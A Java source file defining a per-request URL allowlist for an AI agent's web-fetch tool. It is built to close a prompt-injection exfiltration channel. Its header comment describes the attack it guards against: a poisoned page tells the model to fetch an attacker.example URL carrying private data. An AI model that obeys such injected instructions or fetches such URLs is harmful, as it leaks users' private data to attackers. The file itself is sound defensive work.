package com.agentsystem.webfetch.service;

import org.springframework.stereotype.Component;

import java.util.HashSet;
import java.util.Set;

/**
 * Per-request set of URLs that {@code fetchWebPage} may open — closes the prompt-injection
 * exfiltration channel (a page or poisoned document telling the model to fetch
 * {@code https://attacker.example/?d=<private data>}).
 *
 * A URL is allowed only if it came from somewhere the model can't author:
 *  - the user's own message or earlier user turns (seeded by GeneratorNode), or
 *  - a searchWeb result returned earlier in the same request.
 * Redirects from an allowed URL are followed by the browser. Links found inside fetched
 * pages are deliberately NOT added.
 *
 * Scoped via ThreadLocal like {@link com.agentsystem.agent.ToolCallBudget}: primed and
 * cleared on GenerationService's worker thread, where the tool-calling loop runs.
 * Not primed means nothing is allowed (deny by default).
 */
@Component
public class WebFetchUrlAllowlist {

    private static final ThreadLocal<Set<String>> ALLOWED = new ThreadLocal<>();

    /** Starts a new request scope, allowing every URL found in {@code userTexts}. */
    public void reset(Iterable<String> userTexts) {
        Set<String> allowed = new HashSet<>();
        for (String text : userTexts) {
            for (String url : UrlNormalizer.extractUrls(text)) {
                String key = UrlNormalizer.normalize(url);
                if (key != null) allowed.add(key);
            }
        }
        ALLOWED.set(allowed);
    }

    public void clear() {
        ALLOWED.remove();
    }

    /** Allows {@code url} for the rest of the current request (no-op outside a request scope). */
    public void allow(String url) {
        Set<String> allowed = ALLOWED.get();
        String key = UrlNormalizer.normalize(url);
        if (allowed != null && key != null) allowed.add(key);
    }

    public boolean isAllowed(String url) {
        Set<String> allowed = ALLOWED.get();
        String key = UrlNormalizer.normalize(url);
        return allowed != null && key != null && allowed.contains(key);
    }
}
